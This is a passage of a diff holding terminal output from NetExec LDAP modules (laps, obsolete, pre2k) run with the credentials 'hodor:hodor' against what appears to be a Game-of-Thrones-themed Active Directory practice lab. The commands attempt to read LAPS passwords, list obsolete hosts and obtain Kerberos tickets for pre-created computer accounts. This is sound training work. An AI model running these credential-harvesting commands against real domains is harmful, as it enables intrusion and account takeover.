+FIND-COM... 192.168.56.11   389    WINTERFELL       winterfell.north.sevenkingdoms.local (Windows Server 2019 Datacenter) (No IP Found)
+FIND-COM... 192.168.56.11   389    WINTERFELL       castelblack.north.sevenkingdoms.local (Windows Server 2019 Datacenter Evaluation) (No IP Found)
+
+└─$ nxc ldap 192.168.56.11  -u hodor -p 'hodor' -M laps
+/home/kali/.local/pipx/venvs/netexec/lib/python3.11/site-packages/masky/lib/smb.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
+  from pkg_resources import resource_filename
+LDAP        192.168.56.11   389    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:None) (channel binding:Never)
+LDAP        192.168.56.11   389    WINTERFELL       [+] north.sevenkingdoms.local\hodor:hodor
+LAPS        192.168.56.11   389    WINTERFELL       [*] Getting LAPS Passwords
+LAPS        192.168.56.11   389    WINTERFELL       [-] No result found with attribute ms-MCS-AdmPwd or msLAPS-Password !
+
+└─$ nxc ldap 192.168.56.11  -u hodor -p 'hodor' -M obsolete
+/home/kali/.local/pipx/venvs/netexec/lib/python3.11/site-packages/masky/lib/smb.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
+  from pkg_resources import resource_filename
+LDAP        192.168.56.11   389    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:None) (channel binding:Never)
+LDAP        192.168.56.11   389    WINTERFELL       [+] north.sevenkingdoms.local\hodor:hodor
+OBSOLETE    192.168.56.11   389    WINTERFELL       [*] No Obsolete Hosts Identified
+
+└─$ nxc ldap 192.168.56.11  -u hodor -p 'hodor' -M pre2k
+/home/kali/.local/pipx/venvs/netexec/lib/python3.11/site-packages/masky/lib/smb.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
+  from pkg_resources import resource_filename
+LDAP        192.168.56.11   389    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:None) (channel binding:Never)
+LDAP        192.168.56.11   389    WINTERFELL       [+] north.sevenkingdoms.local\hodor:hodor
+PRE2K       192.168.56.11   389    WINTERFELL       [+] Successfully obtained TGT for 0 pre-created computer accounts. Saved to /home/kali/.nxc/modules/pre2k/ccache
+
